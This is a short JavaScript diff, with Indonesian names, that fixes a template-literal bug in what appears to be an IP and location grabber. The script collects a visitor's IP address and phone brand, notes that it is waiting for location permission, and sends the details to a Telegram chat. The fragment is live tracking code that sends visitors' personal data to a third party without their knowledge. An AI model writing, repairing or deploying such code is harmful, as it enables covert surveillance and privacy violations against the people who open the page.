@@ -44,7 +44,7 @@ text: pesan
 (async () => {
 const ip = await getIP();
 const merek = getMerekHP();
-const pesanAwal = IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek};
+const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
 await kirimPesanTelegram(pesanAwal);
 })();
 
